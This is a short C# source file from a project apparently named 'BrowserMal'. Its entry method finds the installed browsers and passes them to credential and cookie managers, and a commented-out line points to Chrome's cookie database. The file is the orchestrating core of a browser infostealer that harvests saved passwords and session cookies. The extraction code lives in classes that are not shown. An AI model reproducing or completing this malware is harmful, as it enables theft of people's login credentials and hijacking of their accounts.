using BrowserMal.Browser;
using BrowserMal.Credential;
using BrowserMal.Cookie;
using System.Collections.Generic;

namespace BrowserMal
{
    public class Class1
    {
        //private static string COOKIES_DATA_PATH = "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies";

        private static readonly BrowserManager browserManager = new BrowserManager();
        private static readonly CredentialManager credentialManager = new CredentialManager();
        private static readonly CookieManager cookieManager = new Cookie.CookieManager();

        public static void Start()
        {
            browserManager.Init();
            List<BrowserModel> browsers = browserManager.GetBrowsers();

            credentialManager.Init(ref browsers);
            cookieManager.Init(ref browsers);
        }
    }
}
